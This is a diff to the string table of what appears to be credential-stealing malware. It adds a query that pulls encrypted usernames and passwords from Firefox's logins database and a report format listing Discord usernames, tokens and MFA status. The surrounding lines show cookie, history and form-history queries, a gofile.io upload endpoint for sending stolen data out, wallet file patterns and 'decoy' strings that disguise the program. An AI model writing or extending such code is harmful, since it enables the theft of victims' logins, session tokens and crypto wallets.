@@ -202,6 +202,7 @@ STRINGS = [
     ("gck_query_moz_cookies", "SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies"),
     ("gck_query_places", "SELECT url, title, visit_count, last_visit_date FROM moz_places WHERE visit_count > 0 ORDER BY last_visit_date DESC"),
     ("gck_query_formhistory", "SELECT fieldname, value, timesUsed FROM moz_formhistory"),
+    ("gck_query_logins_sqlite", "SELECT hostname, encryptedUsername, encryptedPassword FROM logins"),
 
     # === gofile.io ===
     ("gofile_upload_url", "https://upload.gofile.io/uploadfile"),
@@ -502,6 +503,9 @@ STRINGS = [
     ("sender_file", "file"),
     ("sender_content", "content"),
     ("sender_embeds", "embeds"),
+    ("discord_report_fmt", "Username: {}\nID: {}\nToken: {}\nBadges: {}\nMFA: {}\n{}\n"),
+    ("discord_accounts_found", " Discord accounts found\n"),
+    ("sender_embeds_status", "embeds["),
 
     # === wallet file patterns ===
     ("wpat_log", ".log"),
@@ -577,7 +581,7 @@ STRINGS = [
     ("decoy_local_env", "LOCALAPPDATA"),
     ("decoy_edge_path", r"Microsoft\Edge\Application"),
     ("decoy_chrome_path", r"Google\Chrome\Application"),
-    ("decoy_json_dummy", r#"{"name":"test","value":123}"#),
+    ("decoy_json_dummy", '{"name":"test","value":123}'),
     ("decoy_env_os", "OS"),
     ("decoy_env_proc_arch", "PROCESSOR_ARCHITECTURE"),
     ("decoy_env_num_procs", "NUMBER_OF_PROCESSORS"),
